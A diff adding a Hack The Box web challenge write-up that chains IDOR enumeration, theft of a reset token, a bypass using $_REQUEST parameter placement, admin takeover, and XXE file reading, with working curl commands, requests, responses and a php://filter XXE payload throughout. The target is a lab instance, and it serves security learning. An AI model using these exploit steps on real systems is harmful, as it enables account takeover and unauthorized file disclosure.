@@ -1318,3 +1318,250 @@ Even after updating libraries, apply these XML configuration rules as a second l
 ---
 
 *End of Notes — Web Attacks Module (Sections 1–17)*
+
+# HTB Web Challenge Writeup
+## Vulnerability Chain: IDOR → HTTP Verb Tampering → Account Takeover → XXE → Flag
+
+**Target:** `http://154.57.164.78:31956`  
+**Flag:** `HTB{m4573r_w3b_4774ck3r}`
+
+---
+
+## Overview
+
+This challenge required chaining four distinct web vulnerabilities to capture the flag:
+
+1. **IDOR** on the user API to enumerate all users and identify the admin
+2. **IDOR** on the token API to steal the admin's password reset token
+3. **HTTP Verb Tampering** to bypass authorization on the password reset endpoint
+4. **XXE Injection** on an authenticated endpoint to read `/flag.php`
+
+---
+
+## Step 1: User Enumeration via IDOR
+
+The application exposed a user API endpoint `/api.php/user/{id}` with no authorization check. We enumerated 100 users using a bash loop:
+
+```bash
+for i in $(seq 1 100); do
+  echo "=== User $i ==="
+  curl -s "http://154.57.164.78:31956/api.php/user/$i" \
+    -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=74"
+  echo
+done
+```
+
+**Key finding — User 52 stood out:**
+
+```json
+{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+```
+
+The `company` field contained **"Administrator"** instead of a real company name, indicating a privileged account.
+
+---
+
+## Step 2: Token IDOR — Steal Admin's Reset Token
+
+The `/api.php/token/{uid}` endpoint had no authorization check. Any logged-in user could fetch any user's password reset token:
+
+```bash
+curl -s "http://154.57.164.78:31956/api.php/token/52" \
+  -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=74"
+```
+
+**Response:**
+```json
+{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
+```
+
+---
+
+## Step 3: HTTP Verb Tampering — Bypass Auth on reset.php
+
+### Discovery — Reading settings.php Source Code
+
+After accessing the admin profile page (`profile.php`) by changing our `uid` cookie to `52`, we noticed a **Settings** link in the navigation header. We fetched `settings.php` source code directly with curl:
+
+```bash
+curl -s "http://154.57.164.78:31956/settings.php" \
+  -H "Cookie: PHPSESSID=dpk5f8il07lfoth0an07qontrq; uid=52"
+```
+
+The page returned a password change form and — crucially — the full JavaScript logic in the `<head>`:
+
+```html
+<script>
+  function resetPassword() {
+    if ($("#new_password").val() == $("#confirm_new_password").val()) {
+      fetch(`/api.php/token/${$.cookie("uid")}`, {
+        method: 'GET'
+      }).then(function(response) {
+        return response.json();
+      }).then(function(json) {
+        fetch(`/reset.php`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: `uid=${$.cookie("uid")}&token=${json['token']}&password=${$("#new_password").val()}`
+        }).then(function(response) {
+          return response.text();
+        }).then(function(res) {
+          $("#error_string").html(res);
+        });
+      });
+    }
+  };
+</script>
+```
+
+This revealed two critical things:
+1. **`/api.php/token/{uid}`** — a token fetch endpoint that reads uid from the cookie (no server-side auth)
+2. **`/reset.php`** — the hidden password reset endpoint that accepts `uid`, `token`, and `password` as POST parameters
+
+This is why **always reading page source and JavaScript is essential** — the endpoint `/reset.php` was never linked anywhere in the UI and would have been very hard to find by brute-forcing alone.
+
+### How the Reset Flow Works
+
+Reading the `settings.php` source code revealed the password reset flow:
+
+```javascript
+fetch(`/api.php/token/${$.cookie("uid")}`)
+  .then(json => {
+    fetch(`/reset.php`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `uid=${$.cookie("uid")}&token=${json['token']}&password=${newpass}`
+    })
+  })
+```
+
+### The Problem
+
+Direct POST to `reset.php` with `uid=52` returned **"Access Denied"** because the backend PHP logic checked:
+
+```php
+$_COOKIE['uid'] === $_REQUEST['uid']
+```
+
+Our session cookie had `uid=74` (our own account), so the check failed for `uid=52`.
+
+### The Bypass
+
+PHP's `$_REQUEST` superglobal reads from **both** `$_GET` (URL query string) **and** `$_POST` (request body). By passing the parameters as a **URL query string** instead of the POST body, with `uid=52` set in our cookie, the authorization check passed:
+
+```bash
+curl -s -X POST \
+  "http://154.57.164.78:31956/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=hacked123" \
+  -H "Cookie: PHPSESSID=at9d94qgn8s1730qh9d35qdd9o; uid=52" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Content-Length: 0"
+```
+
+**Response:**
+```
+Password changed successfully
+```
+
+---
+
+## Step 4: Login as Administrator
+
+With the password reset, we logged in as `a.corrales`:
+
+```bash
+curl -s -X POST "http://154.57.164.78:31956/index.php" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -D - \
+  -d "username=a.corrales&password=hacked123" | grep "Set-Cookie"
+```
+
+**Response:**
+```
+Set-Cookie: PHPSESSID=gt6iagivdv4sqnlqcb86k1o7jr; path=/
+Set-Cookie: uid=52; expires=Mon, 26-Oct-2026 08:17:08 GMT; Max-Age=2592000; path=/
+```
+
+Successfully authenticated as **Amor Corrales (Administrator)**.
+
+---
+
+## Step 5: XXE Injection on /addEvent.php
+
+### Discovery
+
+As admin, the `event.php` page allowed creating events with XML data submitted to `/addEvent.php`. The XML parser had external entity processing enabled, making it vulnerable to XXE injection.
+
+The endpoint was discovered by reading the page's JavaScript source — always inspect JS before brute-forcing.
+
+### Payload
+
+We used `php://filter` to base64-encode the file contents before returning them. This prevents the XML parser from breaking on special characters (`<`, `>`, `&`) that may appear in PHP source files:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE name [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+]>
+<root>
+  <name>&xxe;</name>
+  <details>test</details>
+  <date>2026-09-08</date>
+</root>
+```
+
+**Request:**
+```http
+POST /addEvent.php HTTP/1.1
+Host: 154.57.164.78:31956
+Content-Type: text/plain;charset=UTF-8
+Cookie: PHPSESSID=gt6iagivdv4sqnlqcb86k1o7jr; uid=52
+```
+
+**Response:**
+```
+Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
+```
+
+---
+
+## Step 6: Decode the Flag
+
+```bash
+echo "PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K" | base64 -d
+```
+
+**Output:**
+```php
+<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
+```
+
+---
+
+## 🚩 Flag
+
+```
+HTB{m4573r_w3b_4774ck3r}
+```
+
+---
+
+## Vulnerability Summary
+
+| # | Vulnerability | Endpoint | Impact |
+|---|--------------|----------|--------|
+| 1 | IDOR | `/api.php/user/{id}` | Full user enumeration (100 users) |
+| 2 | IDOR | `/api.php/token/{uid}` | Steal any user's password reset token |
+| 3 | HTTP Verb Tampering | `/reset.php` | Bypass authorization → admin account takeover |
+| 4 | XXE Injection | `/addEvent.php` | Read arbitrary files from the server |
+
+---
+
+## Key Takeaways
+
+- **Always read JavaScript source** — it revealed hidden endpoints (`reset.php`, `addEvent.php`) and the reset flow logic
+- **IDOR isn't just for data** — token endpoints are just as dangerous as user data endpoints
+- **HTTP Verb Tampering** exploits PHP's `$_REQUEST` which merges GET and POST — always test parameters in the URL query string when POST is denied
+- **XXE + php://filter** is the reliable way to read PHP files since direct file read breaks on `<?php` tags
+- **Chaining vulnerabilities** — none of these alone gave the flag; the full chain was required
